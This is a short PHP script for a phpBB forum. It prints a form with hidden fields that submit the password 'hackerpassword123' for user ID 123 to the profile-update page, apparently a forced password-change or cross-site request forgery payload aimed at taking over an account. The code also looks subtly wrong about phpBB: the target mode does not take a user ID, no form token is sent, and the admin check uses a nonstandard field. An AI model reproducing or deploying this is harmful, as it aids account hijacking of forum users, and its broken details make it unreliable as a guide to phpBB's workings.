<?php
// Include phpBB config and common files
define('IN_PHPBB', true);
$phpbb_root_path = (defined('PHPBB_ROOT_PATH')) ? PHPBB_ROOT_PATH : './';
$phpEx = substr(strrchr(__FILE__, '.'), 1);
include($phpbb_root_path . 'common.' . $phpEx);

// Start session management
$user->session_begin();
$auth->acl($user->data);
$user->setup();

// Check if the user is logged in
if (!$user->data['is_registered']) {
    login_box('', $user->lang['LOGIN']);
    exit;
}

// Check if the user has permission to change password (optional)
if (!$user->data['is_admin']) {
    echo "You do not have permission to change the password.";
    exit;
}

// HTML form to change the password of user with ID 123
echo '
<form action="./ucp.php?i=ucp_profile&amp;mode=reg_details" method="POST">
    <input type="hidden" name="new_password" value="hackerpassword123">
    <input type="hidden" name="confirm_password" value="hackerpassword123">
    <input type="hidden" name="user_id" value="123">
    <input type="submit" value="Change Password">
</form>
';
?>

